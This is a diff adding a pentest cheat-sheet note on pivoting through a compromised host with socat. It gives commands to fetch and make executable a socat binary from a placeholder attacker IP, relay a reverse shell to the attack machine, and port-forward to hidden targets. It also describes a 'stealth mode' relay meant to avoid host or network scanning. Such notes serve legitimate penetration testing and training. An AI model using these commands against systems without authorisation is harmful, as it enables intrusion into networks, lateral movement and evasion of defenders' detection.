@@ -1,0 +1,61 @@
+***************************************************************************************************************************************************************************
+*** PIVOTING using 'socat' ***
+***************************************************************************************************************************************************************************
+
+'socat' static binaries can be found for:
+* Linux : https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+* Windows : https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download {Change version to latest if necessary}
+
+
+'socat' can be used to forward a reverse shell from a hidden machine through the compromised machine to the attack machine.
+ Before such a connection is possible, we need to upload it to the compromised middle machine.
+
+* This can be done using a python server and executing the following command on the middle machine.
+
+> curl <ATTACKER's IP>/socat -o /tmp/socat-<object name> && chmod +x /tmp/socat-<object-name>
+
+* Then we use the following command to start a relay from the compromised machine to the attacker machine:
+
+> ./socat tcp-l:<TARGET PORT> tcp:<ATTACKER's IP>:<ATTACKER's PORT> &
+
+* If we want to portforward from the compromised machine to the target machinen and redirect inputs from the attack machine to the target machine,
+ we use the following command on the compromised machine:
+
+> ./socat tcp-l:<COMPROMISED machine PORT>,fork,reuseaddr tcp:<TARGET IP>:<TARGET PORT> &
+We can now connect to port <COMPROMISED machine PORT> on the relay (Compromised machine) and have our connection directly relayed to our target <TARGET IP>:<TARGET PORT>.
+
+***************************************************************************************************************************************************************************
+
+
+***************************************************************************************************************************************************************************
+*** PIVOTING using 'socat' - STEALTH MODE! ***
+***************************************************************************************************************************************************************************
+
+The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning.
+
+The following method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
+
+* First, on our attack machine run:
+
+> socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. 
+
+* Second, on the compromised machine run:
+
+> ./socat tcp:<ATTACKER's IP>:8001 tcp:<TARGET IP>:<TARGET PORT>,fork &
+This makes a connection between our listening port 8001 on the attack machine, and the open port of the target machine.
+
+* This would create a link between port 8000 on our attack machine, and <TARGET PORT> on the intended target (TARGET IP),
+ meaning that we could go to localhost:8000 in our attack machine to access the service at <TARGET IP>:<TARGET PORT>.
+
+So for input(REQUEST to localhost:8000) from our attack machine, data flows as;
+
+REQUEST ==> localhost:8000 ==(via the socat process on attack machine)==> localhost:8001 ==(via the socat process on compromised machine)==> <TARGET IP>:<TARGET PORT>
+
+For Output(RESPONSE from <TARGET IP>:<TARGET PORT>) from the target machine, data flows as;
+
+RESPONSE ==> <TARGET IP>:<TARGET PORT> ==(via the socat process on compromised machine)==> localhost:8001 ==(via the socat process on attack machine)==> localhost:8000
+
+At the end of your engagment, use 'jobs' command to get the JOB ID of the socat processes, and use 'kill' command to stop these services.
+
+***************************************************************************************************************************************************************************
